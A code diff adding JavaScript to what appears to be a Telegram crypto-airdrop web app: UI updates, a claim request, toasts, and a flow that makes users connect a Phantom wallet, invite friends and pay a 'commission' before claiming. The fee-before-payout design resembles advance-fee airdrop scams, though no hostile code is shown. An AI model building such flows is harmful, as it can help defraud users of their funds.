@@ -338,6 +338,92 @@ function updateClaimButton() {
     }
 }
 
+function updateAllTasksUI() {
+    log('🔄 Updating all task UIs...');
+    updateTaskCompleteUI();
+    updateInviteFriendsUI();
+    updateWalletUI();
+    updateCommissionUI();
+    updateClaimButton();
+    log('✅ All UIs updated');
+}
+
+async function claimAirdrop() {
+    log('🎁 Claiming airdrop...');
+    
+    if (!(tasksCompleted.task && tasksCompleted.invite && tasksCompleted.wallet && tasksCompleted.pay)) {
+        showToast('Please complete all tasks first', 'error');
+        return;
+    }
+
+    try {
+        const claimButton = document.getElementById('claimBtn');
+        if (claimButton) {
+            claimButton.disabled = true;
+            claimButton.innerHTML = '⏳ Processing your request...';
+        }
+
+        const response = await fetch('/airdrop/claim', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            }
+        });
+
+        if (response.ok) {
+            const data = await response.json();
+            log('✅ Claim successful: ' + JSON.stringify(data));
+            
+            showToast('🎉 Congratulations! Your request has been registered', 'success');
+            
+            if (claimButton) {
+                claimButton.innerHTML = '✅ Your request has been registered';
+                claimButton.style.background = 'linear-gradient(135deg, #ffd700 0%, #ffed4e 100%)';
+                claimButton.style.color = '#000';
+                claimButton.disabled = true;
+            }
+            
+        } else {
+            const error = await response.json();
+            log('❌ Claim failed: ' + JSON.stringify(error));
+            showToast('Error: ' + (error.detail || 'Please try again'), 'error');
+            
+            if (claimButton) {
+                claimButton.disabled = false;
+                claimButton.innerHTML = '🎉 Congratulations, you are eligible to receive the airdrop! 🎉';
+            }
+        }
+        
+    } catch (error) {
+        log('❌ Claim error: ' + error.message);
+        showToast('Connection error', 'error');
+        
+        const claimButton = document.getElementById('claimBtn');
+        if (claimButton) {
+            claimButton.disabled = false;
+            claimButton.innerHTML = '🎉 Congratulations, you are eligible to receive the airdrop! 🎉';
+        }
+    }
+}
+
+function showToast(message, type = 'info') {
+    const existingToasts = document.querySelectorAll('.toast');
+    existingToasts.forEach(toast => toast.remove());
+
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
+    toast.textContent = message;
+    
+    document.body.appendChild(toast);
+
+    setTimeout(() => toast.classList.add('show'), 100);
+
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 300);
+    }, 3000);
+}
+
 async function detectPhantom() {
     try {
         if (window.solana && window.solana.isPhantom) {
@@ -372,6 +458,62 @@ async function handleWalletConnection() {
         log('❌ Wallet connection error: ' + error.message);
         showToast('Failed to open wallet connection: ' + error.message, 'error');
     }
+}
+
+function handleCommissionClick() {
+    if (!tasksCompleted.wallet) {
+        showToast('Please connect your wallet first', 'error');
+        return;
+    }
+    
+    if (tasksCompleted.pay) {
+        showToast('Commission has already been paid', 'info');
+        return;
+    }
+    
+    const modal = document.getElementById('commission-modal');
+    if (modal) {
+        modal.classList.add('show');
+    }
+}
+
+function closeCommissionModal() {
+    const modal = document.getElementById('commission-modal');
+    if (modal) {
+        modal.classList.remove('show');
+    }
+}
+
+function handleCommissionPayment() {
+    closeCommissionModal();
+    
+    if (!USER_ID) {
+        showToast('Error: User information not found', 'error');
+        return;
+    }
+
+    showToast('Redirecting to payment page...', 'info');
+    
+    const commissionUrl = `/commission/browser/pay?telegram_id=${USER_ID}`;
+    
+    try {
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.openLink(commissionUrl);
+        } else {
+            window.open(commissionUrl, '_blank');
+        }
+    } catch (error) {
+        log('Error opening commission payment: ' + error.message);
+        window.location.href = commissionUrl;
+    }
+}
+
+function handleTaskCompletion() {
+    window.location.href = '/earn';
+}
+
+function handleInviteCheck() {
+    window.location.href = '/friends';
 }
 
 async function sendWalletToServer(walletAddress) {
